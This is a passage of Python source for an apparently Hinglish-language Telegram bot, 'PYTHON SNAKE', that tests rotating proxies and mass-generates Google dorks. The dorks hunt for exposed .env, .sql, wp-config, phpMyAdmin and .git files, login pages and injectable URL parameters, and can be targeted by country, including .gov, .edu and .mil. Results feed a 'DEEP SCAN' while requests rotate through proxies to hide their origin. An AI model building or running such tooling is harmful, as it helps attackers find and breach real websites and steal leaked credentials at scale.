async def _ip_lookup(session, proxy=None, timeout: float = 12.0) -> tuple:
    """(ip, err) — api.ipify → ip-api → ifconfig fallback. proxy=None → direct net check."""
    targets = [("https://api.ipify.org?format=json", "json:ip"),
               ("http://ip-api.com/json", "json:query"),
               ("http://ifconfig.me/ip", "text")]
    err = ""
    for url, mode in targets:
        try:
            kw = {"headers": UA, "ssl": False,
                  "timeout": aiohttp.ClientTimeout(total=timeout)}
            if proxy:
                kw["proxy"] = proxy
            async with session.get(url, **kw) as r:
                body = await r.text(errors="ignore")
                ip = ""
                if mode.startswith("json"):
                    try:
                        ip = str((json.loads(body) or {}).get(mode.split(":")[1]) or "")
                    except Exception:
                        ip = ""
                else:
                    ip = body.strip().split()[0] if body.strip() else ""
                if _valid_ip(ip):
                    return ip, ""
                err = "HTTP %s" % r.status
        except Exception as exc:
            err = "%s: %s" % (type(exc).__name__, str(exc).replace("\n", " ")[:110])
    return "", err


async def rot_live_test(urls: list, tries: int = 3, timeout: float = 12.0) -> dict:
    """Rotating endpoint sach me kaam kar raha hai? IP badalte hain? Engine chalta hai?"""
    out = {"ips": [], "errs": [], "engine": "", "urls": 0, "ms": [],
           "dns": "", "dns_src": "", "host": "", "direct": "", "direct_err": "",
           "conn": ""}
    proxy = urls[0] if urls else None
    if not proxy:
        return out
    conn_url, host, ip, src = await proxy_connect_url(proxy)
    out.update({"dns": ip, "dns_src": src, "host": host, "conn": conn_url})
    conn = mk_connector(limit=6, force_close=True)
    async with aiohttp.ClientSession(connector=conn) as session:
        # 0) direct net check (proxy ke bina) — pata chale net ya proxy ka issue hai
        d_ip, d_err = await _ip_lookup(session, None, timeout=min(10.0, timeout))
        out["direct"], out["direct_err"] = d_ip, d_err
        if host and not ip:
            out["errs"].append("DNS fail: %s resolve nahi hua (system + DoH dono)" % host)
            return out
        for _ in range(max(1, tries)):
            t0 = time.perf_counter()
            got, err = await _ip_lookup(session, conn_url if ip else proxy, timeout)
            if got:
                out["ips"].append(got)
                out["ms"].append(int((time.perf_counter() - t0) * 1000))
            else:
                out["errs"].append(err or "no IP")
        # engine test — DDG Lite ek dork
        try:
            got = await fetch_engine(session, "ddgl", "site:gov.in inurl:login",
                                     proxy=(conn_url if ip else proxy), timeout=14.0)
            out["urls"] = len(got)
            out["engine"] = "ddgl"
        except Exception as exc:
            out["errs"].append("engine: %s" % str(exc)[:110])
    return out


def rot_test_card(res: dict) -> str:
    ips = res.get("ips") or []
    uniq = len(set(ips))
    ok_rot = uniq >= 2
    host = res.get("host") or ""
    dns_txt = ("<code>%s</code> → <code>%s</code> (%s)"
               % (esc(host), esc(res.get("dns") or "—"), res.get("dns_src") or "—")) \
        if host else "—"
    lines = [KV("DNS", dns_txt, "🌐"),
             KV("Net (direct)", ("<code>%s</code>" % esc(res["direct"])) if res.get("direct")
                else "<code>fail</code> — %s" % esc((res.get("direct_err") or "no net")[:70]), "📶"),
             KV("Requests", "<code>%d</code>" % (len(ips) + len(res.get("errs") or [])), "🔢"),
             KV("Working", "<code>%d</code>" % len(ips), "✅"),
             KV("Unique IPs", "<code>%d</code>" % uniq, "🔁"),
             KV("Engine test", "<code>%s</code> → <code>%d URLs</code>"
                % (res.get("engine") or "—", res.get("urls", 0)), "🔍")]
    if not res.get("direct"):
        head = "NET HI NAHI HAI ❌"
        tip = ("\n\n" + P("Phone ka internet check karo (WiFi/data). Proxy se pehle "
                           "bot ka direct net chalta hona chahiye."))
    elif ok_rot:
        head = "ROTATION WORKS ✅"
        tip = "\n\n" + P("Parser ready — run DORKER → DEEP SCAN now.")
    elif ips:
        head = "ENDPOINT OK — IP same"
        tip = ("\n\n" + P("Proxy chal raha hai par IP rotate nahi hua. Ek min baad "
                           "phir test karo — Webshare kaafi baar same IP deta hai."))
    else:
        head = "ROTATION FAILED ❌"
        if res.get("dns"):
            tip = ("\n\n" + P("DNS theek hai (IP mil gaya) — matlab proxy ne connect "
                               "refuse kiya. Username/password plan check karo."))
        else:
            tip = ("\n\n" + P("DNS fail — network p.webshare.io block kar raha hai. "
                               "WiFi/data switch karke ya DoH on karke try karo."))
    body = "\n".join(lines)
    if ips:
        body += "\n\n" + B("IPs") + "\n" + "\n".join(
            "• <code>%s</code>%s" % (esc(_pip),
                                      (" — %sms" % res["ms"][i]) if i < len(res.get("ms") or []) else "")
            for i, _pip in enumerate(ips[:5]))
    if res.get("errs"):
        body += "\n\n" + B("Errors") + "\n" + "\n".join(
            "• <code>%s</code>" % esc(e) for e in (res.get("errs") or [])[:4])
    return H("ROTATION TEST", "%d/%d ok" % (len(ips), max(1, len(ips) + len(res.get("errs") or [])))) \
        + "\n\n" + head + "\n\n" + body + tip


async def input_rot_paste(update, context, text: str):
    """Admin rotating endpoint paste karta hai → parse → save → live test."""
    if not is_admin(update.effective_user.id):
        return
    px = parse_proxies(text or "")
    if not px:
        await update.effective_message.reply_text(
            "❌ Nothing parsed. Format:\n"
            "<code>p.webshare.io:80:USER-rotate:PASS</code>\n"
            "<code>http://USER-rotate:PASS@p.webshare.io:80</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=RK([[InlineKeyboardButton("⬅️ BACK", callback_data="a:proxy")]]))
        await_set(context, "rot_paste")
        context.user_data["await_admin"] = True
        return
    rot_save(px)
    sset("proxy_rotate", 1)
    msg = await update.effective_message.reply_text(
        "🔁 <b>Saved %d endpoint(s)</b> — testing (3 requests + engine)…" % len(px),
        parse_mode=ParseMode.HTML,
        reply_markup=RK([[InlineKeyboardButton("⬅️ BACK", callback_data="a:proxy")]]))
    res = await rot_live_test(px, tries=3)
    try:
        await msg.edit_text(rot_test_card(res), parse_mode=ParseMode.HTML,
                            reply_markup=RK([
                                [InlineKeyboardButton("🔁 TEST AGAIN", callback_data="a:rottest")],
                                [InlineKeyboardButton("⬅️ BACK", callback_data="a:proxy")]]))
    except Exception:
        pass
    await_clear(context)


async def input_px_paste(update, context, text: str):
    """Admin ne proxies paste ki / file bheji → parse → check → save."""
    if not is_admin(update.effective_user.id):
        return
    px = parse_proxies(text or "")
    if not px:
        await update.effective_message.reply_text(
            "❌ No proxy found. Check the format:\n"
            "<code>1.2.3.4:8080</code> ya <code>socks5://user:pass@1.2.3.4:1080</code>",
            parse_mode=ParseMode.HTML, reply_markup=kb_back("a:proxy"))
        await_set(context, "px_paste")
        context.user_data["await_admin"] = True
        return
    msg = await update.effective_message.reply_text(
        "🧅 <b>%s proxies received</b> — checking them (multi-endpoint)…" % fmt(len(px)),
        parse_mode=ParseMode.HTML, reply_markup=kb_back("a:proxy"))

    async def prog(st):
        try:
            await msg.edit_text(
                "🧅 <b>CHECKING</b>\n" + bar_pct(st["done"] / max(1, st["total"]) * 100, 14)
                + "\n\n📥 Total : <code>%s</code>\n🔍 Checked: <code>%s/%s</code>\n✅ Alive : <code>%s</code>"
                % (fmt(st["total"]), fmt(st["done"]), fmt(st["total"]), fmt(st["alive"])),
                parse_mode=ParseMode.HTML, reply_markup=kb_back("a:proxy"))
        except Exception:
            pass

    good = await check_proxies_batched(px, progress=prog)
    if good:
        old = load_proxy_pool() or []
        merged = {g["url"]: g for g in old}
        for g in good:
            merged[g["url"]] = g
        save_proxy_pool(sorted(merged.values(), key=lambda z: z.get("ms", 99999)))
    sset("proxy_rotate", 1)
    await msg.edit_text(
        (H("PROXIES ADDED", "%d alive" % len(good)) + "\n\n"
         + KV("Input", "<code>%s</code>" % fmt(len(px)), "📥") + "\n"
         + KV("Alive", "<code>%s</code>" % fmt(len(good)), "✅") + "\n"
         + KV("Pool now", "<code>%s</code>" % fmt(len(load_proxy_pool() or [])), "🧅") + "\n"
         + KV("Rotation", "<b>ON</b> — a new proxy on every request", "🔄") + "\n\n"
         + (B("Best 5") + "\n" + "\n".join("• <code>%s</code> — %sms"
                                            % (esc(g["url"]), g.get("ms", 0))
                                            for g in good[:5]) if good else
            P("None alive — try again, or add fresh proxies."))),
        parse_mode=ParseMode.HTML, reply_markup=kb_back("a:proxy"))
    await_clear(context)


async def input_nc_kw(update, context, text: str):
    ok, err = kind_check(text, "keywords", "keywords")
    if not ok:
        await update.effective_message.reply_text(err, parse_mode=ParseMode.HTML,
                                                  reply_markup=kb_back("m:home"))
        await_set(context, "nc_kw")
        return
    kws = kw_cores(text, limit=NICHE_KW_MAX) or _lines(text)[:NICHE_KW_MAX]
    context.user_data["niche_kw"] = kws
    await update.effective_message.reply_text(
        (H("ADD NICHE", "step 2 / 2") + "\n\n"
         + KV("Keywords found", "<code>%s</code>" % fmt(len(kws)), "🔑") + "\n\n"
         + "<b>Now send a name for this niche</b>\n"
           "<i>e.g. shopify, gov-bd, crypto, hospitals</i>"),
        parse_mode=ParseMode.HTML, reply_markup=kb_back("m:home"))
    await_set(context, "nc_name")


async def input_nc_name(update, context, text: str):
    name = " ".join(str(text or "").split())[:28]
    kws = context.user_data.get("niche_kw") or []
    if not name:
        await update.effective_message.reply_text("❌ Name cannot be empty.",
                                                  reply_markup=kb_back("m:home"))
        await_set(context, "nc_name")
        return
    if not niche_save(name, kws):
        await update.effective_message.reply_text(
            "❌ Not saved — check the name, or you hit the limit (%d niches)." % NICHE_MAX,
            reply_markup=kb_back("m:home"))
        return
    context.user_data.pop("niche_kw", None)
    context.user_data.pop("niche_stage", None)
    await update.effective_message.reply_text(
        (H("NICHE SAVED", name) + "\n\n"
         + KV("Keywords", "<code>%s</code>" % fmt(len(kws)), "🔑") + "\n"
         + KV("Total niches", "<code>%s</code>" % fmt(len(niche_list())), "📁") + "\n\n"
         + P("This niche is now a button in HQ KEYWORDS → MY NICHES and on the main menu.")),
        parse_mode=ParseMode.HTML,
        reply_markup=RK([[InlineKeyboardButton("📁 MY NICHES", callback_data="kw:niche")],
                         [InlineKeyboardButton("🏠 HOME", callback_data="m:home")]]))


async def cb_dk_cms(update, context, arg: str = ""):
    """CMS dorks — WordPress/Joomla/... ka engine."""
    q = update.callback_query
    if not arg:
        rows = [[InlineKeyboardButton("%s %s" % ("🏗", k.upper()), callback_data="dk:cms:" + k)]
                for k in CMS_DORKS]
        rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:dork")])
        try:
            await q.edit_message_text(
                (H("CMS DORK ENGINE", "%d CMS" % len(CMS_DORKS)) + "\n\n"
                 + P("Pick a CMS — ready-made dorks are built for it (keyword optional).")),
                parse_mode=ParseMode.HTML, reply_markup=RK(rows))
        except Exception:
            pass
        return
    kw = context.user_data.get("gen_kw_text") or ""
    dorks = cms_dorks(arg, kw, n=300)
    if not dorks:
        try:
            await q.answer("Nothing generated", show_alert=True)
        except Exception:
            pass
        return
    context.user_data["last_dorks"] = dorks
    dork_seen_add(dorks)
    path, cnt = dump_text(dorks, "cms_" + arg, "PYTHON SNAKE — %s dorks" % arg)
    try:
        await q.edit_message_text(
            (H("%s DORKS" % arg.upper(), "%s bane" % fmt(cnt)) + "\n\n"
             + KV("CMS", "<code>%s</code>" % arg, "🏗") + "\n"
             + KV("Keyword", "<code>%s</code>" % (esc(kw[:30]) if kw else "—"), "🔑") + "\n\n"
             + B("Top 6") + "\n" + short_list(dorks[:6], 6)),
            parse_mode=ParseMode.HTML,
            reply_markup=RK([[InlineKeyboardButton("🚀 DEEP SCAN", callback_data="f:deep")],
                             [InlineKeyboardButton("⬅️ BACK", callback_data="dk:cms")]]))
    except Exception:
        pass
    await send_file(update, path, "🏗 %s %s dorks" % (fmt(cnt), arg))


async def cb_dk_exp(update, context):
    """Exposed-file dorks — .env/.sql/.bak/phpMyAdmin."""
    q = update.callback_query
    kw = context.user_data.get("gen_kw_text") or ""
    dorks = exposed_dorks(kw, n=300)
    context.user_data["last_dorks"] = dorks
    dork_seen_add(dorks)
    path, cnt = dump_text(dorks, "exposed", "PYTHON SNAKE — exposed files")
    try:
        await q.edit_message_text(
            (H("EXPOSED FILES", "%s dorks" % fmt(cnt)) + "\n\n"
             + P("Dorks that hunt for `.env / .sql / .bak / wp-config / phpMyAdmin / .git`.") + "\n\n"
             + B("Top 6") + "\n" + short_list(dorks[:6], 6)),
            parse_mode=ParseMode.HTML,
            reply_markup=RK([[InlineKeyboardButton("🚀 DEEP SCAN", callback_data="f:deep")],
                             [InlineKeyboardButton("⬅️ BACK", callback_data="m:dork")]]))
    except Exception:
        pass
    await send_file(update, path, "📂 %s exposed-file dorks" % fmt(cnt))


async def cb_dork_more(update, context):
    """🆕 AUR (fresh) — purane keywords se naye dorks."""
    q = update.callback_query
    kws = context.user_data.get("gen_kw_text") or ""
    n = int(context.user_data.get("gen_count") or 500)
    if not kws:
        try:
            await q.answer("Run DORKS GEN first", show_alert=True)
        except Exception:
            pass
        return
    try:
        await q.edit_message_text("🆕 Building fresh dorks… (%s)" % fmt(n),
                                  parse_mode=ParseMode.HTML)
    except Exception:
        pass
    dorks = universal_gen(kws, n=n, fresh=True)
    if not dorks:
        try:
            await q.edit_message_text(
                "❌ Fresh khatam — <code>/fresh clear</code> chalao.",
                parse_mode=ParseMode.HTML, reply_markup=kb_back("m:dork"))
        except Exception:
            pass
        return
    context.user_data["last_dorks"] = dorks
    added = dork_seen_add(dorks)
    sc = [score_dork(d)[0] for d in dorks]
    avg = sum(sc) / len(sc)
    path, cnt = dump_text(dorks, "gen_fresh", "PYTHON SNAKE — fresh dorks")
    try:
        await q.edit_message_text(
            (H("FRESH BATCH", "%s naye dorks" % fmt(cnt)) + "\n\n"
             "🆕 History me add: <code>%s</code>\n"
             "📚 Total          : <code>%s</code>\n"
             "⭐ Avg            : <code>%.0f/100</code>\n\n<b>Top 6:</b>\n%s"
             % (fmt(added), fmt(dork_seen_count()), avg, short_list(dorks[:6], 6))),
            parse_mode=ParseMode.HTML, reply_markup=RK([
                [InlineKeyboardButton("🆕 MORE FRESH", callback_data="dd:more")],
                [InlineKeyboardButton("🚀 DEEP SCAN", callback_data="pr:deep")],
                [InlineKeyboardButton("⬅️ BACK", callback_data="m:dork")],
            ]))
    except Exception:
        pass
    await send_file(update, path, "⚡ %s fresh dorks" % fmt(cnt))


# ── PRO MENU ─────────────────────────────────────────────────────────────────
def pro_menu_kb() -> InlineKeyboardMarkup:
    cfg = pro_load()
    on = len(pro_on_templates(cfg))
    return RK([
        [InlineKeyboardButton("🌐 Set Domains (%d)" % len(cfg["domains"]), callback_data="dp:set:domains")],
        [InlineKeyboardButton("🔢 Set URL Params (%d)" % len(cfg["params"]), callback_data="dp:set:params")],
        [InlineKeyboardButton("📄 Set Filetypes (%d)" % len(cfg["filetypes"]), callback_data="dp:set:filetypes")],
        [InlineKeyboardButton("🔍 Set Search Filters (%d)" % len(cfg["sfilters"]), callback_data="dp:set:sfilters")],
        [InlineKeyboardButton("📋 Set Page Filters (%d)" % len(cfg["pfilters"]), callback_data="dp:set:pfilters")],
        [InlineKeyboardButton("🧩 View Templates (%d/%d ON)" % (on, len(cfg["templates"])),
                              callback_data="dp:tpl")],
        [InlineKeyboardButton("📊 View Current Config", callback_data="dp:cfg")],
        [InlineKeyboardButton("🧬 Gen All Combos", callback_data="dp:combos")],
        [InlineKeyboardButton("♻️ Reset to Default", callback_data="dp:reset")],
        [InlineKeyboardButton("🎯 GEN DORKS (best template)", callback_data="dp:gen")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="m:dork")],
    ])


async def cb_pro_menu(update, context):
    q = update.callback_query
    cfg = pro_load()
    try:
        await q.edit_message_text(
            (H("DORKS GEN PRO", "config + templates") + "\n\n"
             "%s\n%s\n%s\n%s\n%s\n%s\n%s"
             % (KV("Keywords", "<code>%s</code> loaded"
                  % fmt(len(context.user_data.get("last_kws") or [])), "🔑"),
                KV("Domains", "<code>%d</code> — <code>%s</code>"
                   % (len(cfg["domains"]), _demo(cfg["domains"], 5)), "🌐"),
                KV("Params", "<code>%d</code> — <code>%s</code>"
                   % (len(cfg["params"]), ", ".join(cfg["params"][:5])), "🔢"),
                KV("Filetypes", "<code>%d</code> — <code>%s</code>"
                   % (len(cfg["filetypes"]), " ".join(cfg["filetypes"])), "📄"),
                KV("SF", "<code>%d</code> — <code>%s</code>"
                   % (len(cfg["sfilters"]), " ".join(cfg["sfilters"])), "🔍"),
                KV("PF", "<code>%d</code> entries" % len(cfg["pfilters"]), "📋"),
                KV("Enabled", "<code>%d/%d</code> templates"
                   % (len(pro_on_templates(cfg)), len(cfg["templates"])), "✅"))),
            parse_mode=ParseMode.HTML, reply_markup=pro_menu_kb())
    except Exception:
        pass


PRO_SET_META = {
    "domains": ("🌐 SET DOMAINS", "domain extensions",
                ".com .net .org .ru .de .in .pk .us .uk .info .gov",
                ".gov\n.in\n.pk\nexample.com"),
    "params": ("🔢 SET URL PARAMETERS", "URL parameters",
               "id, user_id, cat, type, page, item, product",
               "id\ncat\npage\nuser_id"),
    "filetypes": ("📄 SET FILE TYPES", "file extensions",
                  ".php .asp .aspx .jsp .html .sql .pdf .xml .json",
                  ".php\n.asp\n.aspx\n.jsp"),
    "sfilters": ("🔍 SET SEARCH FILTERS", "Google operators",
                 "inurl: intitle: allinurl: allintitle: intext: allintext: site: filetype:",
                 "inurl:\nintitle:\nallinurl:\nallintitle:"),
    "pfilters": ("📋 SET PAGE FILTERS", "page words (that appear in path/query)",
                 "index, view, page, item, product, user, login, search, show, cat",
                 "index\nview\nlogin\nsearch"),
}


COUNTRIES = [
    ("in", "🇮🇳 INDIA (.in)"), ("pk", "🇵🇰 PAKISTAN (.pk)"), ("bd", "🇧🇩 BANGLADESH (.bd)"),
    ("lk", "🇱🇰 SRILANKA (.lk)"), ("np", "🇳🇵 NEPAL (.np)"), ("mm", "🇲🇲 MYANMAR (.mm)"),
    ("kh", "🇰🇭 CAMBODIA (.kh)"), ("th", "🇹🇭 THAILAND (.th)"), ("vn", "🇻🇳 VIETNAM (.vn)"),
    ("my", "🇲🇾 MALAYSIA (.my)"), ("sg", "🇸🇬 SINGAPORE (.sg)"), ("ph", "🇵🇭 PHILIPPINES (.ph)"),
    ("id", "🇮🇩 INDONESIA (.id)"), ("jp", "🇯🇵 JAPAN (.jp)"), ("kr", "🇰🇷 KOREA (.kr)"),
    ("cn", "🇨🇳 CHINA (.cn)"), ("hk", "🇭🇰 HONGKONG (.hk)"), ("tw", "🇹🇼 TAIWAN (.tw)"),
    ("us", "🇺🇸 USA (.us)"), ("ca", "🇨🇦 CANADA (.ca)"), ("mx", "🇲🇽 MEXICO (.mx)"),
    ("br", "🇧🇷 BRAZIL (.br)"), ("ar", "🇦🇷 ARGENTINA (.ar)"), ("cl", "🇨🇱 CHILE (.cl)"),
    ("co", "🇨🇴 COLOMBIA (.co)"), ("pe", "🇵🇪 PERU (.pe)"), ("ve", "🇻🇪 VENEZUELA (.ve)"),
    ("ec", "🇪🇨 ECUADOR (.ec)"), ("uy", "🇺🇾 URUGUAY (.uy)"), ("py", "🇵🇾 PARAGUAY (.py)"),
    ("bo", "🇧🇴 BOLIVIA (.bo)"), ("cr", "🇨🇷 COSTA RICA (.cr)"), ("pa", "🇵🇦 PANAMA (.pa)"),
    ("do", "🇩🇴 DOMINICAN (.do)"), ("gt", "🇬🇹 GUATEMALA (.gt)"), ("sv", "🇸🇻 EL SALVADOR (.sv)"),
    ("hn", "🇭🇳 HONDURAS (.hn)"), ("ni", "🇳🇮 NICARAGUA (.ni)"), ("cu", "🇨🇺 CUBA (.cu)"),
    ("uk", "🇬🇧 UK (.uk)"), ("ie", "🇮🇪 IRELAND (.ie)"), ("fr", "🇫🇷 FRANCE (.fr)"),
    ("de", "🇩🇪 GERMANY (.de)"), ("nl", "🇳🇱 NETHERLANDS (.nl)"), ("be", "🇧🇪 BELGIUM (.be)"),
    ("ch", "🇨🇭 SWISS (.ch)"), ("at", "🇦🇹 AUSTRIA (.at)"), ("es", "🇪🇸 SPAIN (.es)"),
    ("it", "🇮🇹 ITALY (.it)"), ("pt", "🇵🇹 PORTUGAL (.pt)"), ("gr", "🇬🇷 GREECE (.gr)"),
    ("se", "🇸🇪 SWEDEN (.se)"), ("no", "🇳🇴 NORWAY (.no)"), ("dk", "🇩🇰 DENMARK (.dk)"),
    ("fi", "🇫🇮 FINLAND (.fi)"), ("is", "🇮🇸 ICELAND (.is)"), ("pl", "🇵🇱 POLAND (.pl)"),
    ("cz", "🇨🇿 CZECH (.cz)"), ("sk", "🇸🇰 SLOVAKIA (.sk)"), ("hu", "🇭🇺 HUNGARY (.hu)"),
    ("ro", "🇷🇴 ROMANIA (.ro)"), ("bg", "🇧🇬 BULGARIA (.bg)"), ("hr", "🇭🇷 CROATIA (.hr)"),
    ("rs", "🇷🇸 SERBIA (.rs)"), ("si", "🇸🇮 SLOVENIA (.si)"), ("ba", "🇧🇦 BOSNIA (.ba)"),
    ("mk", "🇲🇰 MACEDONIA (.mk)"), ("al", "🇦🇱 ALBANIA (.al)"), ("ru", "🇷🇺 RUSSIA (.ru)"),
    ("ua", "🇺🇦 UKRAINE (.ua)"), ("by", "🇧🇾 BELARUS (.by)"), ("lt", "🇱🇹 LITHUANIA (.lt)"),
    ("lv", "🇱🇻 LATVIA (.lv)"), ("ee", "🇪🇪 ESTONIA (.ee)"), ("md", "🇲🇩 MOLDOVA (.md)"),
    ("ge", "🇬🇪 GEORGIA (.ge)"), ("am", "🇦🇲 ARMENIA (.am)"), ("az", "🇦🇿 AZERBAIJAN (.az)"),
    ("kz", "🇰🇿 KAZAKHSTAN (.kz)"), ("uz", "🇺🇿 UZBEKISTAN (.uz)"), ("tr", "🇹🇷 TURKEY (.tr)"),
    ("ir", "🇮🇷 IRAN (.ir)"), ("iq", "🇮🇶 IRAQ (.iq)"), ("il", "🇮🇱 ISRAEL (.il)"),
    ("ae", "🇦🇪 UAE (.ae)"), ("sa", "🇸🇦 SAUDI (.sa)"), ("qa", "🇶🇦 QATAR (.qa)"),
    ("kw", "🇰🇼 KUWAIT (.kw)"), ("eg", "🇪🇬 EGYPT (.eg)"), ("ma", "🇲🇦 MOROCCO (.ma)"),
    ("dz", "🇩🇿 ALGERIA (.dz)"), ("tn", "🇹🇳 TUNISIA (.tn)"), ("ly", "🇱🇾 LIBYA (.ly)"),
    ("ng", "🇳🇬 NIGERIA (.ng)"), ("ke", "🇰🇪 KENYA (.ke)"), ("za", "🇿🇦 SOUTHAFRICA (.za)"),
    ("gh", "🇬🇭 GHANA (.gh)"), ("et", "🇪🇹 ETHIOPIA (.et)"), ("tz", "🇹🇿 TANZANIA (.tz)"),
    ("ug", "🇺🇬 UGANDA (.ug)"), ("zw", "🇿🇼 ZIMBABWE (.zw)"), ("zm", "🇿🇲 ZAMBIA (.zm)"),
    ("au", "🇦🇺 AUSTRALIA (.au)"), ("nz", "🇳🇿 NEWZEALAND (.nz)"),
    ("gov", "🏛 GOV (.gov)"), ("edu", "🎓 EDU (.edu)"), ("mil", "🎖 MIL (.mil)"),
]


COUNTRY_PAGE = 45          # ek page pe kitne (Telegram 100-button limit)


def country_kb(page: int = 0) -> InlineKeyboardMarkup:
    total = len(COUNTRIES)
    pages = max(1, (total + COUNTRY_PAGE - 1) // COUNTRY_PAGE)
    try:
        page = max(0, min(pages - 1, int(page or 0)))
    except Exception:
        page = 0
    chunk = COUNTRIES[page * COUNTRY_PAGE:(page + 1) * COUNTRY_PAGE]
    rows = []
    for i in range(0, len(chunk), 3):
        rows.append([InlineKeyboardButton(lbl, callback_data="dp:ctry:%s" % code)
                     for code, lbl in chunk[i:i + 3]])
    if pages > 1:
        nav = []
        if page > 0:
            nav.append(InlineKeyboardButton("⬅️", callback_data="dp:ctry:pg:%d" % (page - 1)))
        nav.append(InlineKeyboardButton("%d / %d" % (page + 1, pages),
                                        callback_data="dp:ctry:pg:%d" % page))
        if page < pages - 1:
            nav.append(InlineKeyboardButton("➡️", callback_data="dp:ctry:pg:%d" % (page + 1)))
        rows.append(nav)
    rows.append([InlineKeyboardButton("🌍 ALL COUNTRIES (mix)", callback_data="dp:ctry:all")])
    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:dork")])
    return RK(rows)


async def cb_country(update, context, code: str = ""):
    q = update.callback_query
    if code.startswith("pg:"):
        try:
            page = int(code[3:] or 0)
        except Exception:
            page = 0
        try:
            await q.edit_message_text(
                (H("COUNTRY DORKS", "%d countries" % len(COUNTRIES)) + "\n\n"
                 + P("Pick a country — dorks are built inside that country's domains.")),
                parse_mode=ParseMode.HTML, reply_markup=country_kb(page))
        except Exception:
            pass
        return
    if not code:
        try:
            await q.edit_message_text(
                (H("COUNTRY DORKS", "dorks with site:.XX") + "\n\n"
                 "%s\n%s\n\n%s"
                 % (P("Pick a country — dorks are built inside that country's domains"),
                    P("Jaise site:.in inurl:login"),
                    KV("Current domains", "<code>%s</code>"
                       % " ".join(pro_load()["domains"][:8]), "📌"))),
                parse_mode=ParseMode.HTML, reply_markup=country_kb())
        except Exception:
            pass
        return
    cfg = pro_load()
    if code == "all":
        cfg["domains"] = ["." + c for c, _ in COUNTRIES if c not in ("gov", "edu")][:10]
        label = "MIX (10 countries)"
    else:
        cfg["domains"] = ["." + code]
        label = dict(COUNTRIES).get(code, "." + code)
    pro_save(cfg)
    try:
        await q.edit_message_text(
            (H("COUNTRY SET", label) + "\n\n"
             "%s\n%s\n\n%s"
             % (KV("Domains", "<code>%s</code>" % " ".join(cfg["domains"]), "🌐"),
                KV("Templates", "<code>%d/%d</code> ON"
                   % (len(pro_on_templates(cfg)), len(cfg["templates"])), "✅"),
                P("Ab GEN DORKS dabao — is country ke dorks banenge"))),
            parse_mode=ParseMode.HTML, reply_markup=RK([
                [InlineKeyboardButton("🎯 GEN DORKS", callback_data="dp:gen")],
                [InlineKeyboardButton("📊 CONFIG", callback_data="dp:cfg"),
                 InlineKeyboardButton("🌍 COUNTRY BADLO", callback_data="dp:country")],
                [InlineKeyboardButton("⬅️ BACK", callback_data="m:dork")],
            ]))
    except Exception:
        pass


async def cb_pro_set(update, context, key: str):
    """dp:set:<key> — ya dp:<key> (country shortcut)."""
    q = update.callback_query
    key = (key or "").replace("country", "domains")
    meta = PRO_SET_META.get(key)
    if not meta:
        return await cb_pro_menu(update, context)
    title, what, ex, exblock = meta
    cfg = pro_load()
    cur = cfg.get(key) or []
    extra = ""
    if key == "pfilters":
        extra = ("\n📖 <b>Page filter kya hai?</b>\n"
                 "URL ke path/query me aane wala word — jaise\n"
                 "<code>site.com/<b>login</b>.php</code>, "
                 "<code>site.com/<b>search</b>?q=</code>\n"
                 "Isse dork banti hai: <code>inurl:shop.</code> + page filter.\n")
    txt = (H(title, "set %s" % what) + "\n\n"
           "📥 <b>%s</b>\n%s\n\n"
           "<code>%s</code>\n%s\n"
           "%s\n\n"
           "%s"
           % (B("Bhejo"), P("comma / space / line — koi bhi"), exblock, extra,
              KV("Abhi", "<code>%d</code> — <code>%s</code>"
                 % (len(cur), _demo(cur, 8)), "📌"),
              P("Send a new one and the old one is replaced")))
    try:
        await q.edit_message_text(txt, parse_mode=ParseMode.HTML,
                                  reply_markup=kb_back("dd:pro"))
    except Exception:
        pass
    await_set(context, "pro_" + key)


PARSE_STRIP = re.compile(r"[;\n,|\s]+")


async def input_pro_set(update, context, key: str, text: str):
    meta = PRO_SET_META.get(key)
    if not meta:
        return
    want = {"domains": "domains", "params": "params", "filetypes": "filetypes",
            "sfilters": "sfilters", "pfilters": "pfilters"}.get(key, "keywords")
    got = detect_kind(text, want=want)
    if got != "keywords" and got != want:
        ok, err = kind_check(text, want, meta[1])
        await update.effective_message.reply_text(err, parse_mode=ParseMode.HTML,
                                                  reply_markup=kb_back("dd:pro"))
        return
    items = [x.strip() for x in PARSE_STRIP.split(text) if x.strip()]
    if not items:
        await update.effective_message.reply_text("❌ Empty list — send it again.")
        return
    # normalise
    out = []
    for it in items:
        it = it.strip().strip(",")
        if not it:
            continue
        if key == "domains":
            it = it if it.startswith(".") else ("." + it.lstrip("."))
            it = it.lower()
        elif key == "filetypes":
            it = it if it.startswith(".") else ("." + it.lstrip("."))
            it = it.lower()
        elif key == "sfilters":
            it = it.lower()
            if not it.endswith(":"):
                it += ":"
        else:
            it = it.lower()
        out.append(it)
    out = _uniq(out)[:400]
    cfg = pro_load()
    cfg[key] = out
    pro_save(cfg)
    await update.effective_message.reply_text(
        (H("SAVED", "%d %s" % (len(out), meta[1])) + "\n\n"
         "%s\n\n<code>%s</code>\n\n%s"
         % (KV("Saved", "<code>%d</code>" % len(out), "✅"),
            esc(" ".join(out[:16])), B("Aage kya?"))),
        parse_mode=ParseMode.HTML, reply_markup=RK([
            [InlineKeyboardButton("📊 VIEW CONFIG", callback_data="dp:cfg"),
             InlineKeyboardButton("🚀 PRO MENU", callback_data="dd:pro")],
            [InlineKeyboardButton("🎯 GEN DORKS", callback_data="dp:gen")],
        ]))
    await_clear(context)


# ── TEMPLATES VIEW + ON/OFF ──────────────────────────────────────────────────
def pro_cfg_text() -> str:
    cfg = pro_load()
    on = pro_on_templates(cfg)
    lines = [H("PRO DORK CONFIG", "live status"), "",
             KV("Keywords", "<code>0</code> loaded", "🔑"),
             KV("Domains", "<code>%d</code> — <code>%s</code>"
                % (len(cfg["domains"]), " ".join(cfg["domains"][:8])), "🌐"),
             KV("Params", "<code>%d</code> — <code>%s</code>"
                % (len(cfg["params"]), ", ".join(cfg["params"][:6])), "🔢"),
             KV("Filetypes", "<code>%d</code> — <code>%s</code>"
                % (len(cfg["filetypes"]), " ".join(cfg["filetypes"])), "📄"),
             KV("SF", "<code>%d</code> — <code>%s</code>"
                % (len(cfg["sfilters"]), " ".join(cfg["sfilters"])), "🔍"),
             KV("PF", "<code>%d</code> entries" % len(cfg["pfilters"]), "📋"),
             KV("Combos", "<code>%d</code>" % len(cfg["combos"]), "🧬"),
             "",
             KV("Enabled", "<code>%d/%d</code> templates" % (len(on), len(cfg["templates"])), "✅"),
             ""]
    for t in cfg["templates"]:
